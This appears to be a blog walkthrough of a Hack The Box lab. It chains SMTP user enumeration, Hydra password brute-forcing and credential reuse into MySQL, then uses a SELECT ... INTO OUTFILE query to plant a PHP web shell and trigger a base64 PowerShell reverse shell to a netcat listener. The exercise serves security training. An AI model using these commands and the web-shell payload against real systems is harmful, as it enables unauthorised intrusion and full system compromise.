<html>
  <head>
    <link rel="icon" href="/assets/imgs/beans.png" type="image/png">
  </head>
  <img src="/assets/imgs/beans.png" alt="Logo" style="position: absolute; top: 0; left: 0; width: 200px; height: auto;">
</html>

[Main Page](/index)


# Attacking Common Services - Easy

---

> We were commissioned by the company Inlanefreight to conduct a penetration test against three different hosts to check the servers' configuration and security. We were informed that a flag had been placed somewhere on each server to prove successful access. These flags have the following format:
HTB{...}
Our task is to review the security of each of the three servers and present it to the customer. According to our information, the first server is a server that manages emails, customers, and their files.

You know the drill! Let's start with an nmap.

```
# Nmap 7.94SVN scan initiated Tue Jan 28 22:33:11 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -p21,25,80,443,587,3306,3389 -oN nmap.out inlanefreight.htb
Nmap scan report for inlanefreight.htb (10.129.203.7)
Host is up (0.075s latency).

PORT     STATE SERVICE       VERSION
21/tcp   open  ftp
| fingerprint-strings: 
|   GenericLines: 
|     220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
|     Command unknown, not supported or not allowed...
|     Command unknown, not supported or not allowed...
|   NULL: 
|_    220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
| ssl-cert: Subject: commonName=Test/organizationName=Testing/stateOrProvinceName=FL/countryName=US
| Not valid before: 2022-04-21T19:27:17
|_Not valid after:  2032-04-18T19:27:17
25/tcp   open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp   open  http          Apache httpd 2.4.53 ((Win64) OpenSSL/1.1.1n PHP/7.4.29)
| http-title: Welcome to XAMPP
|_Requested resource was http://inlanefreight.htb/dashboard/
443/tcp  open  ssl/https
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Restricted Area
|_ssl-date: 2025-01-29T03:35:23+00:00; +2s from scanner time.
587/tcp  open  smtp          hMailServer smtpd
| smtp-commands: WIN-EASY, SIZE 20480000, AUTH LOGIN PLAIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp open  mysql         MySQL 5.5.5-10.4.24-MariaDB
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.24-MariaDB
|   Thread ID: 19
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, FoundRows, IgnoreSigpipes, SupportsTransactions, InteractiveClient, ODBCClient, SupportsCompression, Speaks41ProtocolNew, SupportsLoadDataLocal, LongColumnFlag, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: {fnu!AeXh%xQkIiTK[dg
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: WIN-EASY
|   NetBIOS_Domain_Name: WIN-EASY
|   NetBIOS_Computer_Name: WIN-EASY
|   DNS_Domain_Name: WIN-EASY
|   DNS_Computer_Name: WIN-EASY
|   Product_Version: 10.0.17763
|_  System_Time: 2025-01-29T03:34:51+00:00
| ssl-cert: Subject: commonName=WIN-EASY
| Not valid before: 2025-01-28T03:16:24
|_Not valid after:  2025-07-30T03:16:24
|_ssl-date: 2025-01-29T03:35:23+00:00; +3s from scanner time.
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port21-TCP:V=7.94SVN%I=7%D=1/28%Time=6799A17F%P=x86_64-pc-linux-gnu%r(N
SF:ULL,41,"220\x20Core\x20FTP\x20Server\x20Version\x202\.0,\x20build\x2072
SF:5,\x2064-bit\x20Unregistered\r\n")%r(GenericLines,AD,"220\x20Core\x20FT
SF:P\x20Server\x20Version\x202\.0,\x20build\x20725,\x2064-bit\x20Unregiste
SF:red\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x20not\x20a
SF:llowed\.\.\.\r\n502\x20Command\x20unknown,\x20not\x20supported\x20or\x2
SF:0not\x20allowed\.\.\.\r\n");
Service Info: Host: WIN-EASY; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2s, deviation: 0s, median: 2s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jan 28 22:35:26 2025 -- 1 IP address (1 host up) scanned in 134.48 seconds
```

So we have FTP, SMTP, HTTP/S, MySQL, and RDP running on a windows box. Doesn't look like we have anonymous login on FTP. Given the context of this module, I am assuming the web interface won't be our initial foothold except as a last resort. My next thought is to see if we can enumerate some users on SMTP

```
$ telnet 10.129.134.169 25
Trying 10.129.134.169...
Connected to 10.129.134.169.
Escape character is '^]'.
220 WIN-EASY ESMTP
helo 10.129.134.169
250 Hello.
VRFY bob
502 VRFY disallowed.
EXPN bob
503 Bad sequence of commands
MAIL FROM:test@example.com
250 OK
RCPT TO: test@example.com
530 SMTP authentication is required.
```

Neither VRFY or EXPN work, however the RCPT TO might method work. Let's use smtp-user-enum to try and bruteforce some usernames.

```
└─$ smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.134.169
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 5
Usernames file ........... users.list
Target count ............. 1
Username count ........... 79
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ inlanefreight.htb

######## Scan started at Thu Jan 30 22:51:22 2025 #########
10.129.134.169: fiona@inlanefreight.htb exists
######## Scan completed at Thu Jan 30 22:51:27 2025 #########
1 results.

79 queries in 5 seconds (15.8 queries / sec)
```

Awesome! The user `fiona` is valid. Let's use hydra and try and bruteforce her password.

```
┌──(kali㉿DESKTOP-JETQH0C)-[~/attackingcmnsrvcs]
└─$ hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f smtp://inlanefreight.htb
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-01 09:28:17
[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking smtp://inlanefreight.htb:25/
[25][smtp] host: inlanefreight.htb   login: fiona@inlanefreight.htb   password: 987654321
[STATUS] attack finished for inlanefreight.htb (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-01 09:28:23
```

At first, I used the provided `pws.list`, however that didn't work. So I then used `rockyou.txt` which gave us the password of `987654321`. We can't do much from SMTP other than send emails, which would be a finding in a pentest that could be used for social engineering and phishing emails, however for the purpose of getting us into the machine it doesn't help much. Let's try some password reuse.

```
$ xfreerdp /v:10.129.200.199 /u:fiona /p:987654321
[00:04:33:770] [208:209] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[00:04:33:770] [208:209] [WARN][com.freerdp.crypto] - CN = WIN-EASY
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.200.199:3389)
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - Common Name (CN):
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] -  WIN-EASY
[00:04:33:772] [208:209] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.200.199:3389 (RDP-Server):
        Common Name: WIN-EASY
        Subject:     CN = WIN-EASY
        Issuer:      CN = WIN-EASY
        Thumbprint:  1d:b4:a7:41:69:5c:41:41:10:e3:6b:c8:71:3b:7c:19:4a:52:05:c7:00:5d:ee:a3:1f:e4:ee:12:b0:79:bf:43
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
[00:04:35:362] [208:209] [WARN][com.freerdp.core.nla] - SPNEGO received NTSTATUS: STATUS_LOGON_FAILURE [0xC000006D] from server
[00:04:35:362] [208:209] [ERROR][com.freerdp.core] - nla_recv_pdu:freerdp_set_last_error_ex ERRCONNECT_LOGON_FAILURE [0x00020014]
[00:04:35:362] [208:209] [ERROR][com.freerdp.core.rdp] - rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail
[00:04:35:362] [208:209] [ERROR][com.freerdp.core.transport] - transport_check_fds: transport->ReceiveCallback() - -1
```

As you can see, RDP failed. What about FTP?

```
$ ftp 10.129.200.199
Connected to 10.129.200.199.
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
Name (10.129.200.199:kali): fiona
331 password required for fiona
Password:
230-Logged on
230
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||18592|)

^C
receive aborted. Waiting for remote to finish abort.
```

We logged in! But it doesn't look like FTP wants to list anything. This is because FTP is running in passive mode and theres probably some firewall thing blocking our a connection. Let's try turning it off and see what we get.

```
ftp> passive
Passive mode: off; fallback to active mode: off.
ftp> ls
200 PORT command successful
150 Opening ASCII mode data connection
-r-xr-xrwx   1 owner    group              55 Apr 21  2022      docs.txt
-r-xr-xrwx   1 owner    group             255 Apr 22  2022      WebServersInfo.txt
226 Transfer Complete
ftp> 
```

One thing I want to point out is that we can access the FTP server from the HTTPS service! If we connect to the boxe's https server and provide `fiona`'s credentials we are greated this page:

![ftpoverhttps](/assets/imgs/fohs.pn)]

Let's see what these files have to say.

```
ftp> get docs.txt
local: docs.txt remote: docs.txt
200 PORT command successful
150 RETR command started
    55      400.82 KiB/s
226 Transfer Complete
55 bytes received in 00:00 (156.13 KiB/s)
ftp> get WebServersInfo.txt
local: WebServersInfo.txt remote: WebServersInfo.txt
200 PORT command successful
150 RETR command started
   255        1.29 MiB/s
226 Transfer Complete
255 bytes received in 00:00 (4.79 KiB/s)
ftp>
```

```
$ cat docs.txt
I'm testing the FTP using HTTPS, everything looks good.
$ cat WebServersInfo.txt
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
┌──(kali㉿DESKTOP-JETQH0C)-[~/mygitpage/swammers8.github.io/assets]
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Yep! Confirms the FTP ovoer HTTPS. And the `WebServersInfo.txt` is interesting. The HTTP server is a dafault page, but if we try this `test.php` we see the following.

![hello world](/assets/imgs/hw.png)

This tells us that the server is executing php, and the website root folder is in `C:\xampp\htdocs\`. If we can get a php shell here we could get a foothold. However, we only have access to the FTP server which is in the `C:\CoreFTP` folder. We can't get anything executed from there. So we have to find some other way to get a foothold. Looking back at our nmap scan, we have one other service running, MySQL. Let's test our found creds there.

```
$ mysql -u fiona -p -h 10.129.200.199
ERROR 2026 (HY000): TLS/SSL error: SSL is required, but the server does not support it
```

We can disable ssl with the `--skip-ssl` flag.

```
$ mysql -u fiona -p -h 10.129.200.199 --skip-ssl
Enter password:
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 11
Server version: 10.4.24-MariaDB mariadb.org binary distribution

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Support MariaDB developers by giving a star at https://github.com/MariaDB/server
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]>
```

We're in! Let's see what we can find.

```
MariaDB [phpmyadmin]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| phpmyadmin         |
| test               |
+--------------------+
5 rows in set (0.060 sec)

MariaDB [phpmyadmin]>
```

We have our default databases, as well as a test db which turns out to be completely empty, and the phpmyadmin db which also turns out to be mostly empty. So, there must be something else we can do. Running through my notes I got the idea to see if we can write to system files through MySQL. If we can write a php shell into the website root directory through MySQL, we can simply navigate there and get code execution. Let's try it!

```
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\xampp\htdocs\shell.php';
Query OK, 1 row affected (0.059 sec)
```

First I ran this command, however I got a 404 going to `http://inlanefreight.htb/shell.php`. So I ran it again but this time got this output:

```
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\xampp\htdocs\shell.php';
ERROR 1086 (HY000): File 'C:xampphtdocsshell.php' already exists
```

I forgot to account for the unescaped backslashes `\`, and the file was saving as `C:xampphtdocsshell.php`. This is a simple fix wit the following:

```
MariaDB [(none)]> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:\\xampp\\htdocs\\shell.php';
Query OK, 1 row affected (0.058 sec)
```

Then I went to `http://inlanefreight.htb/shell.php` and it worked!

!(shell)[/assets/imgs/phpshell.png]

I then used a neat little website called [revshells.com](revshells.com) and generated a nice little base64 encoded reverse shell for us.

![revshells](/assets/revshells.png)

I then made a listener with netcat and prepended our powershell shell to the end of our link.

`http://inlanefreight.htb/shell.php?c=powershell+-e+JABjAGwAaQBlAG4AdAAgAD0(...ommitted...)`

```
$ nc -lnvp 8080
listening on [any] 8080 ...
connect to [10.10.14.246] from (UNKNOWN) [10.129.200.199] 49684

PS C:\xampp\htdocs> whoami
nt authority\system
PS C:\xampp\htdocs>
```

And boom! We're in but not only that, we are running as `nt authority\system`! No priv esc required!

```
PS C:\Users\Administrator\Desktop> ls


    Directory: C:\Users\Administrator\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/22/2022  10:36 AM             39 flag.txt


PS C:\Users\Administrator\Desktop> cat flag.txt
HTB{REDACTED}
```

And with that, this box is solved! We used a misconfigured SMTP service to enumerate a user and bruteforce the users password. Then due to password reuse, we were able to login to a misconfigured MySQL service that allowed us to write a php shell on the system to the web service's root directory, allowing us code execution.
